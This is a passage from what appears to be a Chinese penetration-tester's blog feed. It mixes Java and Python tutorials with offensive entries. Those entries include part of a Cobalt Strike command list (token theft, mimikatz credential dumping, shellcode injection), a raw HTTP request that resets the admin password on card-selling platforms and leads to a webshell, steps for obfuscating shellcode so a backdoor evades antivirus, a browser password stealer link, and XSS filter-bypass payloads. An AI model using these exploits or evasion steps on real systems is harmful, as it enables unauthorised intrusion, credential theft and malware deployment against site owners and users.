cmd执行命令<br>    shinject                  将shellcode注入进程<br>    shspawn                   生成进程并将shellcode注入其中<br>    sleep                     设置睡眠延迟时间<br>    socks                     启动SOCKS4代理<br>    socks stop                停止SOCKS4<br>    spawn                     Spawn a session<br>    spawnas                   Spawn a session as anotheruser<br>    spawnto                  Set executable tospawn processes into<br>    spawnu                    Spawn a session underanother PID<br>    ssh                       使用ssh连接远程主机<br>    ssh-key                   使用密钥连接远程主机<br>    steal_token               从进程中窃取令牌<br>    timestomp                 将一个文件时间戳应用到另一个文件<br>    unlink                    Disconnect from parentBeacon<br>    upload                    上传文件<br>    wdigest                   使用mimikatz转储明文凭据<br>    winrm                     使用WinRM在主机上生成会话<br>    wmi                       使用WMI在主机上生成会话<br>    argue                      进程参数欺骗<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Cobalt Strike</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python批量解压</title>
    <link href="/2020/09/10/16/"/>
    <url>/2020/09/10/16/</url>
    
    <content type="html"><![CDATA[<h1 id="CODE"><a href="#CODE" class="headerlink" title="CODE"></a>CODE</h1><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">import os<br>import shutil<br>import zipfile<br>import rarfile<br> <br><span class="hljs-comment"># 首先引入需要的工具包</span><br><span class="hljs-comment"># shutil为后期移动文件所需</span><br> <br> <br><span class="hljs-comment"># 路径改这里！</span><br>parent_path = input(<span class="hljs-string">&#x27;请输入要解压的文件路径：&#x27;</span>)<br> <br><span class="hljs-comment"># 文件类型选择</span><br>file_flag = <span class="hljs-string">&#x27;.&#x27;</span> + input(<span class="hljs-string">&#x27;请输入一种需要解压的压缩类型（例：zip或rar）解压后会删除原有压缩文件，请注意备份：&#x27;</span>)<br> <br> <br><span class="hljs-comment"># 删除已解压过的文件</span><br><span class="hljs-comment"># 一定要先测试，不然很麻烦</span><br>def del_old_zip(file_path):<br>    os.remove(file_path)<br> <br> <br><span class="hljs-comment"># 解压</span><br>def zip_decompress(file_path, root):<br>    <span class="hljs-comment"># 开始</span><br>    <span class="hljs-comment"># zipfile打开zip文件</span><br>    z = zipfile.ZipFile(f<span class="hljs-string">&#x27;&#123;file_path&#125;&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br> <br>    <span class="hljs-comment"># 解压</span><br>    z.extractall(path=f<span class="hljs-string">&quot;&#123;root&#125;&quot;</span>)  <span class="hljs-comment"># path为解压路径，解包后位于该路径下</span><br> <br>    <span class="hljs-comment"># 判断是否需要重复解包</span><br>    <span class="hljs-keyword">for</span> names <span class="hljs-keyword">in</span> z.namelist():<br>        <span class="hljs-keyword">if</span> names.endswith(file_flag):<br>            z.close()<br>            <span class="hljs-built_in">return</span> 1<br> <br>    <span class="hljs-comment"># 结束</span><br>    z.close()<br> <br>    <span class="hljs-built_in">return</span> 0<br> <br> <br>def rar_decompress(file_path, root):<br>    <span class="hljs-comment"># 开始</span><br>    <span class="hljs-comment"># rarfile打开rar文件</span><br>    z = rarfile.RarFile(f<span class="hljs-string">&#x27;&#123;file_path&#125;&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br> <br>    <span class="hljs-comment"># 解压</span><br>    z.extractall(path=f<span class="hljs-string">&quot;&#123;root&#125;&quot;</span>)  <span class="hljs-comment"># path为解压路径，解包后位于该路径下</span><br> <br>    <span class="hljs-comment"># 判断是否需要重复解包</span><br>    <span class="hljs-keyword">for</span> names <span class="hljs-keyword">in</span> z.namelist():<br>        <span class="hljs-keyword">if</span> names.endswith(file_flag):<br>            z.close()<br>            <span class="hljs-built_in">return</span> 1<br> <br>    <span class="hljs-comment"># 结束</span><br>    z.close()<br> <br>    <span class="hljs-built_in">return</span> 0<br> <br> <br>decompress = None<br><span class="hljs-keyword">if</span> file_flag == <span class="hljs-string">&#x27;.zip&#x27;</span>:<br>    decompress = zip_decompress<br><span class="hljs-keyword">elif</span> file_flag == <span class="hljs-string">&#x27;.rar&#x27;</span>:<br>    decompress = rar_decompress<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;格式输入错误或不支持当前格式&#x27;</span>)<br>    os.system(<span class="hljs-string">&#x27;pause&#x27;</span>)<br>    <span class="hljs-built_in">exit</span>(0)<br> <br> <br><span class="hljs-comment"># 因为我在使用过程中发现有些文件解包后会混在一起</span><br><span class="hljs-comment"># 在平时大家手动解压时可能也会遇到提示是否覆盖的问题</span><br><span class="hljs-comment"># 下面的两个函数解决这一问题</span><br> <br><span class="hljs-comment"># 开始要先创建一个大文件夹  与压缩包名字相同</span><br><span class="hljs-comment"># 避免后期混乱和麻烦</span><br>def start_dir_make(root, dirname):<br>    os.chdir(root)<br>    os.mkdir(dirname)<br>    <span class="hljs-built_in">return</span> os.path.join(root, dirname)<br> <br> <br><span class="hljs-comment"># 去除多余文件夹</span><br>def rem_dir_extra(root, father_dir_name):<br>    <span class="hljs-comment"># 递归要注意信息的正常处理  搞不好上一个调用已经改变了东西  而下面的调用还是使用之前的数据</span><br> <br>    try:<br> <br>        <span class="hljs-comment"># 判断文件夹重名  开始</span><br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> os.listdir(os.path.join(root, father_dir_name)):<br> <br>            <span class="hljs-comment"># 第一步判断是不是一个文件夹，如果不是则跳过本次循环</span><br>            <span class="hljs-keyword">if</span> not os.path.isdir(os.path.join(root, father_dir_name, item)):<br>                <span class="hljs-built_in">continue</span><br> <br>            <span class="hljs-comment"># 判断是否要脱掉一层目录结构</span><br>            <span class="hljs-comment"># 文件夹名字要相同，且子目录中只有单独的一个文件夹</span><br>            <span class="hljs-keyword">if</span> item == father_dir_name and len(<br>                    os.listdir(os.path.join(root, father_dir_name))) == 1:<br> <br>                <span class="hljs-comment"># 改变工作目录</span><br>                os.chdir(root)<br> <br>                <span class="hljs-comment"># 将无用文件夹重命名，因为直接移动会有重名错误</span><br>                os.rename(father_dir_name, father_dir_name + <span class="hljs-string">&#x27;-old&#x27;</span>)<br> <br>                <span class="hljs-comment"># 移动文件后删除空文件夹</span><br>                shutil.move(os.path.join(root, father_dir_name + <span class="hljs-string">&#x27;-old&#x27;</span>, item), os.path.join(root))<br>                os.rmdir(os.path.join(root, father_dir_name + <span class="hljs-string">&#x27;-old&#x27;</span>))<br> <br>                <span class="hljs-comment"># 将去掉一层目录结构后的文件夹继续作为父本递归处理下去</span><br>                <span class="hljs-comment"># 这里要注意，上面已经发生过数据的改动，所以下面递归传参一定要正确！</span><br>                rem_dir_extra(root, item)<br> <br>            <span class="hljs-keyword">else</span>:<br> <br>                <span class="hljs-comment"># 处理那些不满足上面条件的文件夹</span><br>                rem_dir_extra(os.path.join(root, father_dir_name), item)<br> <br>    except Exception as e:<br> <br>        <span class="hljs-comment"># 打印错误信息</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;清除文件夹出错&quot;</span> + str(e))<br> <br> <br><span class="hljs-comment"># 入口</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br> <br>    flag = 1<br> <br>    <span class="hljs-keyword">while</span> flag:<br> <br>        <span class="hljs-comment">#  循环遍历文件夹</span><br>        <span class="hljs-keyword">for</span> root, <span class="hljs-built_in">dirs</span>, files <span class="hljs-keyword">in</span> os.walk(parent_path):<br> <br>            <span class="hljs-comment"># 读取文件名</span><br>            <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> files:<br> <br>                <span class="hljs-keyword">if</span> name.endswith(file_flag):<br>                    <span class="hljs-comment"># 创建文件夹</span><br>                    new_ws = start_dir_make(root, name.replace(file_flag, <span class="hljs-string">&#x27;&#x27;</span>))<br> <br>                    <span class="hljs-comment"># zip文件地址</span><br>                    zip_path = os.path.join(root, name)<br> <br>                    <span class="hljs-comment"># 解压</span><br>                    flag = decompress(zip_path, new_ws)<br> <br> <br>                    <span class="hljs-comment"># 一定要备份或先测试，不然可能会凉，自己选择修改</span><br>                    del_old_zip(zip_path)<br> <br>                    <span class="hljs-comment"># 去掉多余的文件结构</span><br>                    rem_dir_extra(root, name.replace(file_flag, <span class="hljs-string">&#x27;&#x27;</span>))<br> <br>                    <span class="hljs-built_in">print</span>(f<span class="hljs-string">&#x27;&#123;root&#125;\\&#123;name&#125;&#x27;</span>.join([<span class="hljs-string">&#x27;文件：&#x27;</span>, <span class="hljs-string">&#x27;\n解压完成\n&#x27;</span>]))<br> <br>    <span class="hljs-comment"># 由于解压可能解了好几次 所以可能会有已经解压好的父级目录重名无法处理 这里要再处理一次</span><br>    rem_dir_extra(os.path.split(parent_path)[0], os.path.split(parent_path)[1])<br> <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解压完成啦，记得检查有没有&#123;&#125;格式之外的呀!\n\n其他格式需要自己改一下了&quot;</span>.format(file_flag))<br> <br>    os.system(<span class="hljs-string">&#x27;pause&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p>在全量代码审计项目中经常会遇到开发把所有目录压缩的情况，这时候有这个就非常方便了，但是要注意一下解压之后会把压缩文件给删了，所以注意备份，用法</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">python unzip.py<br></code></pre></div></td></tr></table></figure><p><img src="/images/16/1.png"><br>原文件<br><img src="/images/16/2.png"><br>效果<br><img src="/images/16/3.png"></p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python小工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某些发卡平台任意密码重置</title>
    <link href="/2020/09/09/6/"/>
    <url>/2020/09/09/6/</url>
    
    <content type="html"><![CDATA[<p><img src="/images/6/1.png"></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">POST /admin/ajax.php?act=upAdmin HTTP/1.1<br><br>..省略字段<br><br>x-requested-with:XMLHttpRequest<br><br>...省略字段<br><br>user=admin&amp;pass=e10adc3949ba59abbe56e057f20f883e<br></code></pre></div></td></tr></table></figure><p>登陆后台后可以在上传logo处getshell</p>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>发卡平台</tag>
      
      <tag>任意密码重置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>lambda表达式示例</title>
    <link href="/2020/08/20/28/"/>
    <url>/2020/08/20/28/</url>
    
    <content type="html"><![CDATA[<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">  <span class="hljs-comment">//return A(a,b,c -&gt; &#123;return B(d,c);&#125;);</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Java8Tester</span> </span>&#123;<br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span></span>&#123;<br>      Java8Tester tester = <span class="hljs-keyword">new</span> Java8Tester();<br><br>         <span class="hljs-comment">//然后&#123;return B(d,c);&#125;相当于定义之后处理&#123; return a * b; &#125;;</span><br>      MathOperation multiplication = (<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b) -&gt; &#123; <span class="hljs-keyword">return</span> a * b; &#125;;<br>      System.out.println(<span class="hljs-string">&quot;10 x 5 = &quot;</span> + tester.operate(<span class="hljs-number">10</span>, <span class="hljs-number">5</span>, multiplication));<br>   &#125;<br>    <br>         <br>       <span class="hljs-comment">// 首先return A(a,b,c就相当于先定义了参数类型</span><br>       <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">MathOperation</span> </span>&#123;<br>         <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">operation</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span>;<br>      &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/images/28/1.png"></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java中的this标识</title>
    <link href="/2020/08/20/27/"/>
    <url>/2020/08/20/27/</url>
    
    <content type="html"><![CDATA[<p>this是为了区分重名，如下例子</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span></span>&#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> age;<br>  <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Demo</span><span class="hljs-params">(String name, <span class="hljs-keyword">int</span> age)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br>  <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">say</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(我叫<span class="hljs-string">&quot; + name + &quot;</span>，已经<span class="hljs-string">&quot; + age + &quot;</span>岁<span class="hljs-string">&quot;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">  </span><br><span class="hljs-string">    public static void main(String[] args) &#123;</span><br><span class="hljs-string">        Demo obj = new Demo(&quot;</span>novy<span class="hljs-string">&quot;, 3);</span><br><span class="hljs-string">        obj.say();</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br></code></pre></div></td></tr></table></figure><p>在本类中demo有两个name，为了编译器区分name，用到了this，</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Demo</span><span class="hljs-params">(String name, <span class="hljs-keyword">int</span> age)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br></code></pre></div></td></tr></table></figure><p>这里的this.name意思就是这里的name是class<br>demo方法内部的name（上面的name），this.name=name后面的name是本方成员方法的name<br>通俗地说，在一个办公室里有a和b两个傻吊，我跟c说让傻吊出一份审计报告，但是c不知道我说的傻吊是哪个，这时候我就说让a傻吊去出一份审计报告，c就知道是让a去出审计报告。<br>这里的办公室就是类，c是编译器，我是开发，a和b是类里的两个方法成员，傻吊是方法里同名的变量。<br>起初我说了傻吊，但是c不知道是哪个傻吊，后面我加上了a傻吊，c就知道了</p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C++后门免杀</title>
    <link href="/2020/08/18/9/"/>
    <url>/2020/08/18/9/</url>
    
    <content type="html"><![CDATA[<h1 id="详细介绍："><a href="#详细介绍：" class="headerlink" title="详细介绍："></a>详细介绍：</h1><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4OTM2ODgyMw==&mid=2247483687&idx=1&sn=892275228419900e2bbf2e488909e94d&chksm=cfedb8bff89a31a949643a94f6a7248f22159c97a4a7ebfcb9c9f6eeb80ebe70d767a2910f29&mpshare=1&scene=1&srcid=08189egbvwgzQ8P3kRObfYVc&sharer_sharetime=1597718108261&sharer_shareid=591bd17d9ff0cfa0f0099bfe9c6009d5&key=b6de4a213a64b729cb10f5f6715c569e058b18f37449955a78fc5ef15f70251524a81c5980efe843e25f4caf918d497591377346d4cc975106432cb7f7134a3e0deb10de618cb3a7655b18ec2469739ba2727478187f93b1307706d3d9945241322bb8f8329ea3f14c5143ba2eed862497b57ee135e6da9288322479f22dc3ca&ascene=1&uin=MjkyMzYzMDUzMg==&devicetype=Windows+10+x64&version=62090529&lang=zh_CN&exportkey=A1k2nyaAJNBsGOOfBJ0VGo0=&pass_ticket=sI6ma7r0VNkLp9brita8cyZw3IM7RGX3/cw7aR5wt7N89ecQ3T0WT7Lp6v6EDQoi" title="免杀项目推荐">免杀项目推荐</a></p><h1 id="简单用例"><a href="#简单用例" class="headerlink" title="简单用例"></a>简单用例</h1><p>首先CS生成一个shellcode,然后混淆一下<br>先把\x都删了<br><img src="/images/8/1.png"><br>0替换成*<br><img src="/images/8/2.png"><br>再把剩下的倒序<br><img src="/images/8/3.png"><br>打开项目，在FileItem.cpp里的第17行ch1函数内容替换成shellcode，然后计算shellcode字符数<em>2，比如我的shellcode是1782个字符，</em>2之后就是3564<br><img src="/images/8/4.png"><br>不要调试，直接编译生成<br><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1597995267128.png"><br><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1597994503512.png"><br>上线<br><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1597995720098.png"><br>查杀<br><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1597995122689.png"><br><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1597995153374.png"><br>微步<br><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1597995804197.png"><br><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1597995846470.png"></p>]]></content>
    
    
    <categories>
      
      <category>免杀</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cobalt strike后门</tag>
      
      <tag>免杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记录一下a-team写的浏览器密码提取工具（ BrowserGhost）</title>
    <link href="/2020/08/11/24/"/>
    <url>/2020/08/11/24/</url>
    
    <content type="html"><![CDATA[<p>项目来源地址：<a href="https://github.com/QAX-A-Team/BrowserGhost">https://github.com/QAX-A-Team/BrowserGhost</a></p><p><img src="/images/24/1.png"></p>]]></content>
    
    
    <categories>
      
      <category>渗透实战</category>
      
    </categories>
    
    
    <tags>
      
      <tag>浏览器密码提取</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python生成数字</title>
    <link href="/2020/08/10/25/"/>
    <url>/2020/08/10/25/</url>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10000000</span>):<br>i=<span class="hljs-built_in">str</span>(i)<br>print(i.zfill(<span class="hljs-number">7</span>))<span class="hljs-comment">#如果不要0001这种样式的话就改成1，就会从1开始</span><br></code></pre></div></td></tr></table></figure><p>从0000000到10000000，在做越权和信息泄露测试时遍历id专用<br><img src="/images/25/1.png"><br><img src="/images/25/2.png"></p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python小工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss bypass小记</title>
    <link href="/2020/08/10/23/"/>
    <url>/2020/08/10/23/</url>
    
    <content type="html"><![CDATA[<p>有时候waf会针对payload过滤onerror、alert等之类的关键字事件属性，或者把关键字事件替换成其他字符，单独的事件属性不会防护，这时候可以用换行来解决</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">&lt;img src=<span class="hljs-number">1</span> <br>onerror <br>=alert(<span class="hljs-number">1</span>)<br></code></pre></div></td></tr></table></figure><p><img src="/images/23/1.png"><br>如果只单独针对alert做防护的话就可以用拼接的方式来绕过：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">&lt;details open ontoggle=top[<span class="hljs-string">&#x27;al&#x27;</span>%<span class="hljs-number">2</span>B<span class="hljs-string">&#x27;ert&#x27;</span>](<span class="hljs-number">1</span>) &gt;<br>&lt;details open ontoggle=self[<span class="hljs-string">&#x27;al&#x27;</span>%<span class="hljs-number">2</span>B<span class="hljs-string">&#x27;ert&#x27;</span>](<span class="hljs-number">1</span>) &gt;<br>&lt;details open ontoggle=parent[<span class="hljs-string">&#x27;al&#x27;</span>%<span class="hljs-number">2</span>B<span class="hljs-string">&#x27;ert&#x27;</span>](<span class="hljs-number">1</span>) &gt;<br>&lt;details open ontoggle=frames[<span class="hljs-string">&#x27;al&#x27;</span>%<span class="hljs-number">2</span>B<span class="hljs-string">&#x27;ert&#x27;</span>](<span class="hljs-number">1</span>) &gt;<br>&lt;details open ontoggle=content[<span class="hljs-string">&#x27;al&#x27;</span>%<span class="hljs-number">2</span>B<span class="hljs-string">&#x27;ert&#x27;</span>](<span class="hljs-number">1</span>) &gt;<br>&lt;details open ontoggle=<span class="hljs-built_in">window</span>[<span class="hljs-string">&#x27;al&#x27;</span>%<span class="hljs-number">2</span>B<span class="hljs-string">&#x27;ert&#x27;</span>](<span class="hljs-number">1</span>) &gt;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XSS绕过</tag>
      
      <tag>OWASPTOP10漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDEA打包JAR包的两种方法</title>
    <link href="/2020/07/10/21/"/>
    <url>/2020/07/10/21/</url>
    
    <content type="html"><![CDATA[<p>首先要了解一下在java中maven项目想要打包war或jar是取决于pom.xml中的标明，比如这是mave普通的java项目<br><img src="/images/21/1.png"><br>这是javaweb的项目<br><img src="/images/21/2.png"><br>今天记录一下idea打包jar包的两种方法</p><h1 id="一、Maven-Lifecycle"><a href="#一、Maven-Lifecycle" class="headerlink" title="一、Maven Lifecycle"></a>一、Maven Lifecycle</h1><p>依次打开右上方的Maven - Lifecycle，按图中顺序执行<br><img src="/images/21/3.png"><br>如果代码有错误，在进行到compile时会有报错，所以我们首先要确定代码无报错，也就是代码没有红线，比如这种：<br><img src="/images/21/4.png"><br>全部错误排除完成后再运行一次，全部成功后就会在target目录生成一个jar包<br><img src="/images/21/5.png"></p><h1 id="二、Project-Structure"><a href="#二、Project-Structure" class="headerlink" title="二、Project Structure"></a>二、Project Structure</h1><p>在上述的方法中普遍会报错，出现类似找不到入口的情况<br><img src="/images/21/6.png"><br>这时候就会用到Project Structure里的打包jar方法，会比较麻烦。<br>首先依次选择file-Project Structure-Artifacts,然后点击+，选From module with depenencies（empty麻烦一点，相当于自定义）<br><img src="/images/21/7.png"><br>然后选择主类（程序入口），一般会默认给你列出来的<br><img src="/images/21/8.png"><br>点击OK之后下面的META-INF就会亮起来，选一个META-INF文件存放的地方，一般都是在main目录下，跟java并排，我们直接在main下新建一个resources目录用来存放META-INF文件，最终就是这样：<br><img src="/images/21/9.png"><br>点击OK之后就是这样子，然后再OK一次<br><img src="/images/21/10.png"><br>然后依次选择Build-Artifacts<br><img src="/images/21/11.png"><br>然后build<br><img src="/images/21/12.png"><br>最后就会在你的项目目录里生成一个out目录，jar包就在里面<br><img src="/images/21/13.png"><br>运行：<br><img src="/images/21/14.png"></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
      <tag>IDEA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JSPXCMS任意重定向</title>
    <link href="/2020/07/10/15/"/>
    <url>/2020/07/10/15/</url>
    
